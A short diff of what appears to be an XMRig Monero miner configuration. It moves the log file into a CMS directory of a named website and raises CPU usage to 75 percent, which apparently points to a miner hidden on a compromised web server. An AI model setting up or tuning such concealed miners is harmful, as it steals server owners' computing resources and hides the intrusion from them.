@@ -6,11 +6,11 @@
     "retry-pause": 5,
     "donate-level": 0,
     "syslog": false,
-    "log-file": null,
+    "log-file": "/phpstudy/www/www.dingfengtouzi.com/finecms/system/xmr/xm/log.txt",
     "print-time": 60,
     "av": 0,
     "safe": false,
-    "max-cpu-usage": 65,
+    "max-cpu-usage": 75,
     "cpu-priority": null,
     "threads": null,
     "pools": [
